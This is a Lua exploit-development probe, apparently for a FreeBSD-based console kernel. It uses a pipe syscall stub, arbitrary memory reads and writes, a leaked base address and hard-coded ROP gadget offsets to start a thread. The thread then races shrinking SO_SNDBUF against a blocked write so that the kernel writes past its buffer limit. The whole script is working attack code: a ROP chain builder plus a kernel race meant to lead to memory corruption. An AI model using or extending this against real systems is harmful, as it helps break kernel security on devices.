-- CRASH_CLASS: MODERATE
-- PROBE 93c4: SO_SNDBUF race — measure exactly how much child writes past hiwat
--
-- 93c3 showed: fill=65536, drain1=65620, drain2=100 with hiwat=1
-- Child wrote 184+ bytes with hiwat=1. Need to:
-- 1. Drain fully (loop until empty)
-- 2. Count total bytes to measure exact overwrite
-- 3. Unblock child so it returns and stores its ret value

print("=== PROBE 93c4 ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function fmt(val)
    if val == nil then return "nil" end
    if type(val) == "table" and val.h then
        return string.format("0x%08X%08X", val.h, val.l)
    end
    return string.format("0x%X", N(val))
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(N(fake_tcb), uint64(N(fake_tcb)))
local fsbase_ptr = memory.alloc(8)
wq(N(fsbase_ptr), uint64(N(fake_tcb)))

local sv = memory.alloc(4)
local ov = memory.alloc(4)
local ol = memory.alloc(4)
local dbuf = memory.alloc(0x1000)
local fill_buf = memory.alloc(256)
local sp = memory.alloc(8)
local res = memory.alloc(8)
local par_a = memory.alloc(0x40)
local tid_a = memory.alloc(8)
local stk_a = memory.alloc(0x4000)
local sb_a = N(stk_a)
local ss_a = 0x2000

local TRIALS = 5
local CHILD_WRITE_SIZE = 0x1000  -- 4096

for trial = 1, TRIALS do
    if not alive() then print("DEAD at t" .. trial); break end

    wq(N(res), uint64(0xDEADDEAD))

    wd(N(sp), 0); wd(N(sp)+4, 0)
    local sr = sgn(mk(135)(uint64(1), uint64(1), uint64(0), sp))
    if sr ~= 0 then print("t" .. trial .. ": sp fail"); break end
    local fW = rd(N(sp)) or -1
    local fR = rd(N(sp)+4) or -1

    wd(N(sv), 65536)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)

    -- Fill to capacity
    local filled = 0
    for i = 1, 300 do
        local ok2, ret = pcall(function()
            return mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(256), uint64(0x80))
        end)
        if not ok2 then break end
        local v = sgn(ret)
        if v <= 0 then break end
        filled = filled + v
    end

    -- Build child chain: sysarch + write(fW, buf, 4096) BLOCKING + store + exit
    local off = 0
    for i = 0, ss_a - 1, 4 do wd(sb_a + i, 0) end
    local rsp_a = sb_a + ss_a - ((sb_a + ss_a) % 16) - 8
    local function emit(v) wq(rsp_a + off, v); off = off + 8 end

    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fsbase_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(fW))
    emit(g_pop_rsi); emit(uint64(N(fill_buf)))
    emit(g_pop_rdx); emit(uint64(CHILD_WRITE_SIZE))
    emit(g_pop_rax); emit(uint64(4))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(N(res)))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    for i = 0, 0x3C, 4 do wd(N(par_a) + i, 0) end
    wq(N(par_a), g_bare_ret)
    wq(N(par_a) + 0x08, uint64(0))
    wq(N(par_a) + 0x10, uint64(sb_a))
    wq(N(par_a) + 0x18, uint64(ss_a))
    wq(N(par_a) + 0x30, tid_a)

    pcall(function() mk(455)(par_a, uint64(0x38)) end)

    -- Let child enter write() and block
    for w = 1, 10000 do local _ = rd(sb_a) end

    -- *** SHRINK hiwat ***
    wd(N(sv), 1)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)
    wd(N(ov), 0); wd(N(ol), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), ov, ol) end)
    local hiwat = rd(N(ov)) or -1

    -- Drain-read-drain loop: drain, wait, drain more, until child finishes
    local total_drained = 0
    local drain_rounds = 0
    for round = 1, 20 do
        local round_drained = 0
        for d = 1, 200 do
            local ok4, dr = pcall(function()
                return mk(29)(uint64(fR), uint64(N(dbuf)), uint64(0x1000), uint64(0x80))
            end)
            if not ok4 then break end
            local dv = sgn(dr)
            if dv <= 0 then break end
            round_drained = round_drained + dv
        end
        total_drained = total_drained + round_drained
        drain_rounds = drain_rounds + 1

        -- Check if child finished
        local cret_now = rd(N(res)) or 0
        local cret_hi = rd(N(res)+4) or 0
        if cret_now ~= 0xDEADDEAD or cret_hi ~= 0xDEADDEAD then
            -- Child returned
            break
        end

        if round_drained == 0 then
            -- Nothing to drain — spin to let child make progress
            for w = 1, 50000 do local _ = rd(sb_a) end
        end
    end

    -- Final check
    for w = 1, 100000 do local _ = rd(sb_a) end

    local cret = rd(N(res)) or 0xDEAD
    local cret_hi = rd(N(res)+4) or 0
    if cret_hi == 0xFFFFFFFF then cret = -(0x100000000 - cret) end

    -- One more drain pass
    local final_drain = 0
    for d = 1, 200 do
        local ok5, dr = pcall(function()
            return mk(29)(uint64(fR), uint64(N(dbuf)), uint64(0x1000), uint64(0x80))
        end)
        if not ok5 then break end
        local dv = sgn(dr)
        if dv <= 0 then break end
        final_drain = final_drain + dv
    end
    total_drained = total_drained + final_drain

    local child_wrote = total_drained - filled
    local anom = (child_wrote > hiwat and hiwat > 0 and hiwat < 100)

    print(string.format("t%d: fill=%d hw=%d total_drain=%d child_extra=%d cw_ret=%d rounds=%d%s",
        trial, filled, hiwat, total_drained, child_wrote, cret, drain_rounds,
        anom and " ***RACE***" or ""))

    if anom then
        print(string.format("  *** CHILD WROTE %d BYTES WITH HIWAT=%d ***", child_wrote, hiwat))
    end

    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)
end

print("")
print(string.format("alive=%s", alive() and "Y" or "N"))
print("=== 93c4 COMPLETE ===")
